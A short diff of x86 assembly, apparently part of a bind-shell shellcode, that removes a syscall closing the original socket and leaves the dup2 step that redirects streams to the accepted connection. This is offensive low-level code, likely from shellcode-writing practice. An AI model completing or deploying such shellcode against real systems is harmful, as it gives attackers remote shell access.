@@ -116,8 +116,6 @@ _start:
 	;
 	push eax              ; temporarily holding CONNECTION fd so as to not lose track
 	
-	int 0x80              ; -> syscall to close original sock fd
-
 	xor eax, eax
 	mov al, 0x3f          ; hex for 63 dup2 syscall
 	pop ebx               ; now holds accept fd
